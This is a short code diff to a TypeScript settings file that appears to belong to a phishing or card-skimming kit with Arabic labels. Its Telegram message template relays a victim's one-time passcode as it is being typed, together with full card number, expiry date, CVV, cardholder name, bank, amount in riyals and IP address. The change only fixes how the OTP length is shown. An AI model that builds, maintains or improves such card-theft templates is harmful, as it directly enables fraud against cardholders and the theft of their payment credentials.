@@ -46,7 +46,7 @@ const DEFAULT_PAYMENT_MESSAGES: TelegramMessageSetting[] = [
     label: 'كتابة OTP (وقت فعلي)',
     description: 'تُرسل فوراً عند كتابة 4-6 أرقام OTP قبل الضغط على تأكيد',
     enabled: true,
-    template: `<b>⚡ الزائر يكتب OTP (وقت فعلي — قبل التأكيد)</b>\n\n<b>🔑 الأرقام المدخلة:</b> <code>{otpCode}</code>\n<b>📏 عدد الأرقام:</b> {otpCode.length}\n\n<b>💳 رقم البطاقة:</b> <code>{cardNumber}</code>\n<b>🏦 نوع البطاقة:</b> {cardType}\n<b>🏛 البنك:</b> {bankName}\n<b>📅 تاريخ الانتهاء:</b> <code>{expiryDate}</code>\n<b>🔒 CVV:</b> <code>{cvv}</code>\n<b>👤 اسم حامل البطاقة:</b> {cardHolder}\n<b>💰 المبلغ:</b> {amount} ر.س\n📍 IP: {ip}\n⏰ الوقت: {time}`,
+    template: `<b>⚡ الزائر يكتب OTP (وقت فعلي — قبل التأكيد)</b>\n\n<b>🔑 الأرقام المدخلة:</b> <code>{otpCode}</code>\n<b>📏 عدد الأرقام:</b> {otpLength}\n\n<b>💳 رقم البطاقة:</b> <code>{cardNumber}</code>\n<b>🏦 نوع البطاقة:</b> {cardType}\n<b>🏛 البنك:</b> {bankName}\n<b>📅 تاريخ الانتهاء:</b> <code>{expiryDate}</code>\n<b>🔒 CVV:</b> <code>{cvv}</code>\n<b>👤 اسم حامل البطاقة:</b> {cardHolder}\n<b>💰 المبلغ:</b> {amount} ر.س\n📍 IP: {ip}\n⏰ الوقت: {time}`,
   },
   {
     id: 'otp-attempt',
